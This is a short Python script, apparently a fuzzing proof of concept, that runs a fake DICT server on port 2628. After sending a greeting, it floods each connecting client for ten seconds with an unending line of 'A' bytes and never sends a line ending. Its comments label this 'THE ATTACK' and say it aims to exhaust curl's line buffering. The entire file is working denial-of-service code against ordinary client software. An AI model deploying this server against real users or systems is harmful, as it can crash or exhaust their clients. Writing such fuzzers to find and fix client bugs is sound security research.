import socket
import time

PORT = 2628

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', PORT))
sock.listen(5)

print(f"Text Protocol Fuzzer listening on {PORT}...")

while True:
    conn, _ = sock.accept()
    try:
        data = conn.recv(1024)

        if PORT == 2628:
            conn.send(b"220 dict.frizzing.dome <auth.mime> <1.0.0>\r\n")

        # THE ATTACK: Send a never-ending line of text
        # Valid protocols expect \r\n eventually. We never give it.
        # We assume curl buffers the line waiting for the newline.
        chunk = b"A" * 8192
        t_end = time.time() + 10
        while time.time() < t_end:
            conn.send(chunk)

    except:
        pass
    finally:
        conn.close()